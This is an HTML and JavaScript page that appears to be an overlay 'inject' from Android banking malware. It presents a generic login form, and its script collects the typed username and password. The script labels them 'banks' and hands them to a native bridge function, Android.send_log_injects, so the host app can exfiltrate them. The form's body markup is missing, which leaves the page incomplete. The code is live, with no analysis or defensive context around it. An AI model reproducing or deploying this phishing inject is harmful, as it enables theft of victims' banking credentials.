<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <style>
        body {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            padding: 20px;
            flex: 1;
        }

        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }
        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: 100%;
            position: absolute;
            z-index: 1;
            left:0;
            top: 50%;
            line-height: 0;
            color: #767676;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder,
        .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: -0.5em;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .input {
            border: 0;
            border-bottom: 1px solid #5a5a5a;
            transition-duration: 0.1s;
        }

        .input:focus {
            border-bottom: 2px solid #5a5a5a;
        }

        .button {
            padding: 5px;
            width: 50%;
            background-color: #0072bb;
            color: #fff;
            border: 0;
            border-radius: 3px;
            font-weight: 600;
        }

        .button:disabled {
            background-color: #bfbfbf;
            color: #808080;
        }

        .error {
            border-color: #f00 !important;
        }
    </style>
</head>

    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    <script>
         $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData'),
            passBlock = document.getElementById('passBlock'),
            checked = document.getElementById('checked'),
            check = document.getElementById('check');

        function checkedd(){
            check.style.display = 'none';
            checked.style.display = 'inline'
        }

        function noCheck(){
            checked.style.display = 'none';
            check.style.display = 'inline'
        }

        function checkLenght(){
            if(login.value.length >= 6 ) {
                sendData.disabled = false
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = function() {
            passBlock.style.display = 'block';
            if(password.value.length < 4) {
                password.classList.add('error');
                password.focus();
            } else {
                password.classList.remove('error');
                

                var data = {};
                    data.login = login.value;
                    data.password = password.value;
                    data.type_injects = "banks";
                    data.closed = "close_activity_injects";

                    var ua = navigator.userAgent.toLowerCase();
                    if(ua.indexOf("android") > -1) {
                        try {
                            Android.send_log_injects(JSON.stringify(data))
                        } catch (err) {}
                    }else{
                        alert(JSON.stringify(data));
                    }
            }
        }
    </script>
